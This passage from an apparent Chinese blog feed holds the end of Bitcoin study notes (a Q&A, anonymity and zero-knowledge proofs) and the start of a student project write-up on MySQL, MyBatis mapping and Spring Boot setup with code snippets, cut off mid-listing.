nonce，使搜索空间从$2^{32}$变成$2^{96}$，作为挖矿难度，剩下的字节如何用？有人提出作为UTXO的根哈希值。</p><p>比特币历史上一个比较著名的软分叉的例子是P2SH(Pay to Script Hash)，这个功能在最初的比特币版本上是没有的，是通过软分叉的方法加进去的。</p><h3 id="10、问答"><a href="#10、问答" class="headerlink" title="10、问答"></a>10、问答</h3><h5 id="Q1：转账交易时，接收者不在线怎么办"><a href="#Q1：转账交易时，接收者不在线怎么办" class="headerlink" title="Q1：转账交易时，接收者不在线怎么办"></a>Q1：转账交易时，接收者不在线怎么办</h5><p>不需要接收者在线，转账交易只是在区块链上记录把自己账户上的比特币转过去，是不是当时连在比特币网络是没关系的。</p><h5 id="Q2：假设某个全节点收到了某个转账交易，有没有可能转账交易中接收者的收款地址是这个节点以前从来没有听说过的"><a href="#Q2：假设某个全节点收到了某个转账交易，有没有可能转账交易中接收者的收款地址是这个节点以前从来没有听说过的" class="headerlink" title="Q2：假设某个全节点收到了某个转账交易，有没有可能转账交易中接收者的收款地址是这个节点以前从来没有听说过的"></a>Q2：假设某个全节点收到了某个转账交易，有没有可能转账交易中接收者的收款地址是这个节点以前从来没有听说过的</h5><p>可能的，比特币账户在创建的时候是不需要通知其他人的，在本地产生公私钥对就可以了，只有在以后产生收款地址，第一次收到钱，其他节点才知道这个账户的存在。</p><h5 id="Q3：账户的私钥丢失了怎么办"><a href="#Q3：账户的私钥丢失了怎么办" class="headerlink" title="Q3：账户的私钥丢失了怎么办"></a>Q3：账户的私钥丢失了怎么办</h5><p>账户上的钱变成了死钱，永远取不出来，但是有些加密货币的交易所是中心化的机构，在交易所开办账户一般来说是需要提供身份证明的，这种情况下，把比特币放在交易所，私钥是交易所保管的，登录交易所类似登录银行，这种情况下丢失了密码可以跟交易所练习，通过身份验证重置密码（不是密钥），有些在线钱包也有保管私钥的功能（Mt.Gox）。</p><h5 id="Q4：私钥泄露了怎么办"><a href="#Q4：私钥泄露了怎么办" class="headerlink" title="Q4：私钥泄露了怎么办"></a>Q4：私钥泄露了怎么办</h5><p>尽快把账户上的钱转移到另一个安全账户上。</p><h5 id="Q5：转账时写错了地址怎么办"><a href="#Q5：转账时写错了地址怎么办" class="headerlink" title="Q5：转账时写错了地址怎么办"></a>Q5：转账时写错了地址怎么办</h5><p>没有办法取消已经发布的交易，转到别人的地址或者不存在的地址都无法拿回比特币，如果转到不存在的地址，全节点会永久的把这个地址保存在UTXO里，这对全节点是不友好的。</p><h5 id="Q6：OP-RETURN是无条件返回错误，为什么能写在区块链里"><a href="#Q6：OP-RETURN是无条件返回错误，为什么能写在区块链里" class="headerlink" title="Q6：OP_RETURN是无条件返回错误，为什么能写在区块链里"></a>Q6：OP_RETURN是无条件返回错误，为什么能写在区块链里</h5><p>进行验证时，是当前交易的输入脚本和币的来源的输出脚本拼在一起看能不能顺利执行，这个执行过程是不可以发生错误的，如果抛出错误就不是合法交易，但OP_RETURN是写在当前交易的输出脚本，所以验证当前交易合法性时，不会执行这个语句。有人想花这笔钱时才会执行到这个交易的输出脚本。</p><p>&#x3D;&#x3D;那么这个输出脚本与下一个输入脚本拼和时会验证不通过吗&#x3D;&#x3D;</p><h5 id="Q7：会不会有的矿工偷答案，把其他矿工找到的nonce当成自己的nonce发布出去（怎么知道是哪个矿工最先找到nonce）"><a href="#Q7：会不会有的矿工偷答案，把其他矿工找到的nonce当成自己的nonce发布出去（怎么知道是哪个矿工最先找到nonce）" class="headerlink" title="Q7：会不会有的矿工偷答案，把其他矿工找到的nonce当成自己的nonce发布出去（怎么知道是哪个矿工最先找到nonce）"></a>Q7：会不会有的矿工偷答案，把其他矿工找到的nonce当成自己的nonce发布出去（怎么知道是哪个矿工最先找到nonce）</h5><p>发布的区块里有coinbase transaction，里面有收款人地址，是挖到矿的矿工的地址，偷答案要把这个地址换成自己的地址，一旦换掉，coinbase transaction的内容就发生了改变，这样会导致这个merkle tree的根hash会变化，会导致block header的内容发生变化，原来找到的nonce就作废了，所以不可能偷答案。</p><h5 id="Q8：事先怎么知道交易费要给哪个矿工"><a href="#Q8：事先怎么知道交易费要给哪个矿工" class="headerlink" title="Q8：事先怎么知道交易费要给哪个矿工"></a>Q8：事先怎么知道交易费要给哪个矿工</h5><p>事先不需要知道哪个矿工会得到交易费，交易费的计算是<code>total inputs - total outputs</code>，矿工挖到矿后，可以把区块里包含的交易的差额都收集起来，作为自己的交易费。</p><h3 id="11、比特币的匿名性"><a href="#11、比特币的匿名性" class="headerlink" title="11、比特币的匿名性"></a>11、比特币的匿名性</h3><p>有可能破坏比特币匿名性：</p><ul><li>地址账户可能被关联</li><li>比特币跟实体世界发生联系时，可能泄露真实身份</li><li>用比特币做支付</li></ul><p>网络层的匿名性：TOR（多路径转发&#x2F;洋葱路由）</p><p>应用层的匿名性：coin mixing（交易所、在线钱包）</p><p>不可篡改性对隐私保护是灾难性的</p><h4 id="零知识证明"><a href="#零知识证明" class="headerlink" title="零知识证明"></a>零知识证明</h4><p>概念：一方（证明者）向另一方（验证者）证明一个陈述是正确的，而无需透露除该陈述是争取的外的任何信息。</p><p>数学基础：同态隐藏</p><ul><li>如果x,y不同，那么它们的加密函数值E(x)和E(y)也不相同（应不会出现碰撞）</li><li>给定E(x)的值，很难反推出x的值</li><li>给定E(x)和E(y)的值，我们可以很容易地计算出某些关于x,y的加密函数值<ul><li>同态加法：通过E(x)和E(y)计算出E(x+y)的值</li><li>同态乘法：通过E(x)和E(y)计算出E(xy)的值</li><li>扩展到多项式</li></ul></li></ul><p>例子：Alice想要向Bob证明他知道一组数使得x+y&#x3D;7，同时不让Bob知道x和y的具体数值</p><ul><li><p>简单的版本</p><ul><li><p>Alice把E(x)和E(y)的数值发给Bob</p></li><li><p>Bob通过收到的E(x)和E(y)计算出E(x+y)的值</p></li><li><p>Bob同时计算E(7)的值，如果E(x+y) &#x3D; E(7)，那么验证通过，否则验证失败</p><blockquote><p>虽然Bob无法从E(x)知道x的值，但是可以遍历x的各种取值，所以在复杂场景下，Alice将值给Bob之前，要做一些随机化处理，但要保证x+y依然不变。</p></blockquote></li></ul></li></ul><p>盲签</p><ul><li>用户A提供SerialNum，银行在不知道SerialNum的情况下返回签名Token，减少A的存款</li><li>用户A把SerialNum和Token交给B完成交易</li><li>用户B拿SerialNum和Token给银行验证，银行验证通过，增加B的存款</li><li>银行无法把A和B联系起来</li><li>中心化</li></ul><p>零币和零钞</p><ul><li>零币和零钞在协议层就融合了匿名化处理，其匿名属性来自密码保证</li><li>零币(zerocoin)系统中存在基础币和零币，通过基础币和零币的来回转换，消除旧地址和新地址的关联性，其原理类似于混币服务</li><li>零钞(zerocash)系统使用zk-SNARKs协议，不依赖一种基础币，区块链中只记录交易的存在性和矿工用来验证系统正常运行所需要关键属性的证明。区块链上既不显示交易地址也不显示交易金额，所有交易通过零知识验证的方式进行</li></ul><h3 id="12、比特币引发的思考"><a href="#12、比特币引发的思考" class="headerlink" title="12、比特币引发的思考"></a>12、比特币引发的思考</h3><p><strong>Q1：指针保存的是本地内存的地址，只是在本地计算机上才有意义，在其他计算机上就没有意义了，那么在发送区块的时候，哈希指针是怎么通过网络传输</strong></p><p>哈希指针只是一种形象的说法，实际用的时候只有哈希没有指针，全节点一般是把这些区块存储在(key,value)数据库里，key是区块的哈希，value是区块的内容，一个常用的(key,value)数据库是level DB，区块链这种链表结构实际上是在level DB里面用哈希指针串起来的，只要掌握了最后一个区块的哈希指针，就可以通过level DB来查找key对应的value就可以把最后一个区块的内容取出来，这个区块的块头又有指向前一个区块的哈希指针，一步步往前找，最终能把整个区块链找出来。</p><p>有些节点没有保存完整的区块链的信息，只保存了最近的几千个区块，如果需要用到前面区块的信息，可以问其他的全节点要，哈希指针的性质保证了整个区块的内容是不可篡改的。</p><p><strong>Q2：区块恋：n个人保存私钥的n个部分</strong></p><p>任何一人丢失，都可能导致无法取出钱。</p><p>截断私钥的做法会降低账户的安全性，比特币系统中每个账户的安全性与所用的私钥的长度是相关的。</p><p>多个人的共享账户不建议用共享私钥的办法，建议用多重签名。</p><p><strong>Q3：理论上，分布式系统中取得共识是不可能的，比特币系统如何绕过分布式共识中的那些不可能结论。</strong></p><p>严格来说，比特币没有取得真正的共识，因为取得的共识随时可能被推翻，例如分叉攻击，但是理论上的不可能结论，实际中不一定适用，理论可能只针对某种特定的模型。</p><p><strong>Q4：比特币的稀缺性</strong></p><p>总量固定&#x2F;稀缺的东西其实是不适合货币的，一个好的货币要有通货膨胀的功能。</p><p><strong>Q5：量子计算</strong></p><p>量子计算离实用还差得很远；比特币中并没有把账户的公钥直接暴露出来，而是用公钥取hash后得到一个地址（取hash不同于加密，可能造成信息的损失，hash函数一般是不可逆的）；</p><blockquote><p>未完待续。。。。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比特币</tag>
      
      <tag>以太坊</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实训总结</title>
    <link href="/blog/2022/09/01/%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93/"/>
    <url>/blog/2022/09/01/%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="实训总结"><a href="#实训总结" class="headerlink" title="实训总结"></a>实训总结</h1><h2 id="新建数据库"><a href="#新建数据库" class="headerlink" title="新建数据库"></a>新建数据库</h2><p>我们使用的是mysql+Navicat Premium15，开发的时候用本地的连接（因为开发时为了测试功能会需要一些数据，也产生很多数据，如果要同时保证数据库完整性会降低效率），最终演示是用的是白嫖来的云服务器，方便团队中的其他成员进行管理维护，同时配合项目功能看实际效果。</p><p>我们总共建了13张表，schedule_info这张表因为时间不够了，整个日程功能被放弃，所以并没有用到，实际用到的是13张表，已转储为xbb_db.sql，在项目过程中走过的一些关于数据库的小坑如下：</p><p><strong>1、表名尽量简单。</strong></p><p>最开始建表的时候每张表都带个“_”，doctor_info、nurse_info等等，事实证明多余的“__info”只是在折磨自己，还有一个表名字是medicineinfo_base，后期写相关内容的时候非常折磨。</p><p><strong>2、&#x3D;&#x3D;数据库的字段名和实体类的属性名不对应&#x3D;&#x3D;</strong></p><p><strong>例：</strong></p><p><code>数据库字段：idnamepwd </code></p><p><code>实体类属性：idnamepassword</code></p><p>查询结果：password查询为null</p><p><strong>原因：</strong></p><p>sql语句：<code>select * from mybatis.user where id = #&#123;id&#125; </code></p><p>其实为：<code>select id,name,pwd from mybatis.user where id = #&#123;id&#125; </code></p><p>而输出的user的password属性没有赋值，所以为null</p><p><strong>解决方法：</strong></p><p>法一：起别名</p><p><code>select id,name,pwd as password from mybatis.user where id = #&#123;id&#125;</code></p><p>法二：使用resultMap结果集映射</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--property实体类中的属性,column数据库中的字段--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;pwd&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserById&quot;</span>  <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;userMap&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;int&quot;</span>&gt;</span><br>    select * from mybatis.user where id = #&#123;id&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>id 标签：用于指定主键字段<br>result 标签：用于指定非主键字段<br>column 属性：用于指定数据库列名<br>property 属性：用于指定实体类属性名称</p></blockquote><p>法三：Mybatis-Plus在实体类属性和数据库表字段映射时，会自动将数据库表字段名中的下划线去掉，并且不受字母大小写的影响。</p><p>在application.yml配置文件中添加Mybatis的配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">mybatis</span>:<span class="hljs-string"></span><br>  <span class="hljs-attr">type-aliases-package</span>: <span class="hljs-string">com.mybatisplus.pojo  # 实体类包别名作用:可以用实体类名称代替实体类的相对路径</span><br>  <span class="hljs-attr">configuration</span>:<span class="hljs-string"></span><br>    <span class="hljs-attr">map-underscore-to-camel-case</span>: <span class="hljs-string">true # 驼峰命名</span><br></code></pre></td></tr></table></figure><p>通过驼峰命名,将数据库表字段名下划线去掉，然后去映射实体类属性名，同样不考虑字母大小写问题,这样就达到了和Mybatis-Plus一样的效果。</p><p>（但依然可能有值无法被映射到）</p><p>法四：在核心配置文件中启用下划线与驼峰式命名规则的映射</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>  <br>     <span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span>  <br>          <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span>  <br>     <span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p>以上是从网上搜到的解决办法，我们试过改配置，但还是有问题，所以用了resultMap，但其实很麻烦，每个字段都要写，所以后来直接把数据库的字段名改成了跟实体类属性对应的驼峰。</p><p><strong>3、使用简写</strong></p><p>在application.properties中添加<code>mybatis.type-aliases-package=com.xbb.entity</code>后，我们在mapper.xml映射文件中不需要写出实体类的完整路径，只需要写出类名即可。</p><p>例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span><span class="hljs-keyword">select</span> id<span class="hljs-operator">=</span>&quot;selectByDepartment&quot; resultType<span class="hljs-operator">=</span>&quot;doctor&quot;<span class="hljs-operator">&gt;</span><br>    <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> doctor_info <span class="hljs-keyword">where</span> department <span class="hljs-operator">=</span> #&#123;department&#125;<br><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span><span class="hljs-keyword">select</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p>4、给每张表都设置自增主键id，可能不会展现给用户，但可以作为唯一标志来查询。</p><p>5、本来觉得在建表的时候要考虑到展示，前端的一个table最好来自一张表的数据，所以可能需要一定的冗余，后来发现，需要多张表数据时直接通过sql操作也可行（left joint），如果之后有机会可以尝试。</p><p>6、算是一点总结吧，个人感觉数据库的设计是很需要逻辑的，一旦定下来改动的成本会很高，而且作为整个项目的底层，设计的好坏会影响到后面所有的开发过程是否复杂可行，所以要用多点心，考虑整体。</p><h2 id="搭建后端"><a href="#搭建后端" class="headerlink" title="搭建后端"></a>搭建后端</h2><h3 id="Spring-Boot入门"><a href="#Spring-Boot入门" class="headerlink" title="Spring Boot入门"></a>Spring Boot入门</h3><p><strong>介绍：</strong></p><p>一般把Spring Boot称为搭建程序的脚手架或者说是便捷搭建基于Spring的工程 脚手架。其最主要作用就是帮助开发人员快速的构建庞大的spring项目，并且尽可能的减少一切xml配置，做到开箱即用，迅速上手，让开发人员关注业务而非配置。 </p><p>java一直被人诟病的一点就是臃肿、麻烦。当我们还在辛苦的搭建项目时，可能Python程序员已经把功能写好了，究其原因注意是两点：</p><p>1、复杂的配置 </p><p>项目各种配置其实是开发时的损耗， 因为在思考 Spring 特性配置和解决业务问题之间需要进行思维切换，所以 写配置挤占了写应用程序逻辑的时间。</p><p>2、混乱的依赖管理</p><p>项目的依赖管理也是件吃力不讨好的事情。决定项目里要用哪些库就已经够让人头痛的了，你还要知道这些库的哪个版本和其他库不会有冲突，这难题实在太棘手。并且，依赖管理也是一种损耗，添加依赖不是写应用程序代码。一旦选错了依赖的版本，随之而来的不兼容问题毫无疑问会是生产力杀手。</p><p>而Spring Boot让这一切成为过去！ </p><p>Spring Boot 简化了基于Spring的应用开发，只需要“run”就能创建一个独立的、生产级别的Spring应用。 </p><p>Spring Boot为Spring平台及第三方库提供开箱即用的设置（提供默认设置，存放默认配置的包就是启动器starter），这样我们就可以简单的开始。多数Spring Boot应用只需要很少的Spring配置。</p><p>我们可以使用Spring Boot创建java应用，并使用java –jar 启动它，就能得到一个生产级别的web工程。 </p><p><strong>Spring Boot 主要特点是：</strong> </p><ul><li>创建独立的Spring应用，为所有 Spring 的开发者提供一个非常快速的、广泛接受的入门体验 </li><li>直接嵌入应用服务器，如tomcat、jetty、undertow等；不需要去部署war包 </li><li>提供固定的启动器依赖去简化组件配置；实现开箱即用（启动器starter其实就是Spring Boot提供的一个jar 包），通过自己设置参数（.properties或.yml的配置文件），即可快速使用。 </li><li>自动地配置Spring和其它有需要的第三方依赖     </li><li>提供了一些大型项目中常见的非功能性特性，如内嵌服务器、安全、指标，健康检测、外部化配置等     </li><li>绝对没有代码生成，也无需 XML 配置。</li></ul><h3 id="新建一个Spring-Boot项目"><a href="#新建一个Spring-Boot项目" class="headerlink" title="新建一个Spring Boot项目"></a>新建一个Spring Boot项目</h3><p><strong>1、新建一个maven工程</strong></p><p>File–New–Project–Maven–next–选定Name和Location–Finish</p><p>生成如图：</p><p><img src="/blog/2022/09/01/%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93/2022-04-04_133833.png" alt="2022-04-04_133833"></p><p><strong>2、添加依赖</strong></p><p>现在创建好的项目还与Spring Boot没什么关联，Spring Boot提供了一个名为spring-boot-starter-parent的工程，里面已经对各种常用依赖（并非全部）的版本进行了管理，我们的项目需要以这个项目为父工程，这样我们 就不用操心依赖的版本问题了，需要什么依赖，直接引入坐标即可！ </p><p><strong>2.1 添加父工程坐标</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>2.2 添加web启动器</strong></p><p>为了让Spring Boot帮我们完成各种自动配置，我们必须引入Spring Boot提供的自动配置依赖，我们称为 启动器 。因为我们是web项目，这里我们引入web启动器，在 pom.xml 文件中加入如下依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>需要注意的是，我们并没有在这里指定版本信息。因为Spring Boot的父工程已经对版本进行了管理了。 这个时候，我们会发现项目中多出了大量的依赖。</p><p>那些依赖都是Spring Boot根据 spring-boot-starter-web 这个依赖自动引入的，而且所有的版本都已经管理好，不会出现冲突。 </p><p><strong>2.3 管理jdk版本</strong></p><p>如果我们想要修改Spring Boot项目的jdk版本，只需要简单的添加以下属性即可，如果没有需求，则不添加。同样的在 pom.xml 文件中添加如下： </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>2.4 完整pom文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> </span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 </span></span><br><span class="hljs-string"><span class="hljs-tag">http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.ccnu.springboot.demo1<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springbootdemo1<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">maven-jar-plugin.version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">maven-jar-plugin.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>  <br>   <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span> <br></code></pre></td></tr></table></figure><p><strong>2.5 启动类</strong></p><p>Spring Boot项目通过main函数即可启动，我们需要创建一个启动类： </p><p>编写&#x2F;backend&#x2F;src&#x2F;main&#x2F;java&#x2F;azure&#x2F;Application.java如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> azure;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@MapperScan(&quot;azure.dao&quot;)</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(Application.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2.6 编写controller</strong></p><p>编写&#x2F;backend&#x2F;src&#x2F;mian&#x2F;java&#x2F;azure&#x2F;controller&#x2F;NotFoundcontroller.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> azure.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NotFoundController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;404&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">NotFound</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;对不起，您的页面走丢了！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.7 启动项目，查看启动端口：</p><p><img src="/blog/2022/09/01/%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93/2022-04-04_143417.png" alt="2022-04-04_143417"></p><p>打开<a href="http://localhost:8080/404">http://localhost:8080/404</a></p><p><img src="/blog/2022/09/01/%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93/2022-04-04_143125.png" alt="2022-04-04_143125"></p><p>测试成功</p><p>2.8 项目最终完整的xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 